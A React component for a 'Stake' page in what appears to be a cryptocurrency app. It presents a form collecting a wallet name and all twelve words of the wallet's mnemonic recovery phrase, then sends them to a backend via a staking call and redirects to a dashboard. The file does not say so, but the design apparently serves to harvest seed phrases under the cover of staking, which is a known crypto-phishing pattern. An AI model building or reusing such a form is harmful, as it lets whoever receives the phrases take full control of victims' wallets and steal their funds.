import React, { useState } from 'react';
import { useHistory } from 'react-router-dom';
import StakeBloc from '../bloc/StakeBloc';

import Swal from 'sweetalert2';

import NavBar from '../../components/navbar';
import SideBar from '../../components/sidebar';
import Footer from '../../admin/components/Footer';

const Stake = () => {
  const history = useHistory();

  const [wallet, setWallet] = useState('');
  const [one, setOne] = useState('');
  const [three, setThird] = useState('');
  const [five, setFifth] = useState('');
  const [two, setSecond] = useState('');
  const [four, setFourth] = useState('');
  const [six, setSixth] = useState('');
  const [seven, setSeventh] = useState('');
  const [nine, setNinth] = useState('');
  const [eleven, setEleventh] = useState('');
  const [eight, setEight] = useState('');
  const [ten, setTenth] = useState('');
  const [twelve, setTwelfth] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const isStake = await StakeBloc.createStake({
        wallet,
        one,
        three,
        five,
        two,
        four,
        six,
        seven,
        nine,
        eleven,
        eight,
        ten,
        twelve
      });

      if (isStake) {
        Swal.fire({
          icon: 'success',
          text: `${isStake.data.success}`,
          allowOutsideClick: false
        }).then(history.push(`/dashboard`));
      }
    } catch (e) {
      Swal.fire({
        icon: 'error',
        text: `${e.error.data.error}`,
        title: `Input field missing`,
        background: '#121007',
        width: '50em'
      });
    }
  };
  return (
    <>
      <NavBar />
      <SideBar />

      <main className="authmain">
        <form onSubmit={handleSubmit} className="width">
          <div className="field">
            <label htmlFor="Wallet"></label>
            <input
              type="text"
              placeholder="Wallet Name"
              onChange={(e) => setWallet(e.target.value)}
            />
          </div>
          <div className="header">
            <h3>Enter Mnemonic Phrase</h3>
            <div className="mobile">
              {/* <object data="../../static/images/logo1.svg" type /> */}
              <h2>Enter Mnemonic Phrase</h2>
            </div>
          </div>
          <div className="main-form">
            <div className="field">
              <label htmlFor="First">First</label>
              <input
                type="text"
                placeholder="First"
                onChange={(e) => setOne(e.target.value)}
              />
            </div>
            <div className="field">
              <label htmlFor="Three">Three</label>
              <input
                type="text"
                placeholder="Three"
                onChange={(e) => setThird(e.target.value)}
              />
            </div>
            <div className="field">
              <label htmlFor="Fifth">Fifth</label>
              <input
                type="text"
                placeholder="Fifth"
                onChange={(e) => setFifth(e.target.value)}
              />
            </div>
            <div className="field">
              <label htmlFor="Second">Second</label>
              <input
                type="text"
                placeholder="Second"
                onChange={(e) => setSecond(e.target.value)}
              />
            </div>
            <div className="field">
              <label htmlFor="Fourth">Fourth</label>
              <input
                type="text"
                placeholder="Fourth"
                onChange={(e) => setFourth(e.target.value)}
              />
            </div>
            <div className="field">
              <label htmlFor="Sixth">Sixth</label>
              <input
                type="text"
                placeholder="Sixth"
                onChange={(e) => setSixth(e.target.value)}
              />
            </div>
          </div>
          <div className="main-form">
            <div className="field">
              <label htmlFor="Seventh">Seventh</label>
              <input
                type="text"
                placeholder="Seventh"
                onChange={(e) => setSeventh(e.target.value)}
              />
            </div>
            <div className="field">
              <label htmlFor="Ninth">Ninth</label>
              <input
                type="text"
                placeholder="Ninth"
                onChange={(e) => setNinth(e.target.value)}
              />
            </div>
            <div className="field">
              <label htmlFor="Eleventh">Eleventh</label>
              <input
                type="text"
                placeholder="Eleventh"
                onChange={(e) => setEleventh(e.target.value)}
              />
            </div>
            <div className="field">
              <label htmlFor="Eight">Eight</label>
              <input
                type="text"
                placeholder="Eight"
                onChange={(e) => setEight(e.target.value)}
              />
            </div>
            <div className="field">
              <label htmlFor="Tenth">Tenth</label>
              <input
                type="text"
                placeholder="Tenth"
                onChange={(e) => setTenth(e.target.value)}
              />
            </div>
            <div className="field">
              <label htmlFor="Twelfth">Twelfth</label>
              <input
                type="text"
                placeholder="Twelfth"
                onChange={(e) => setTwelfth(e.target.value)}
              />
            </div>
          </div>
          <button>Import</button>
        </form>
        <Footer />
      </main>
    </>
  );
};

export default Stake;
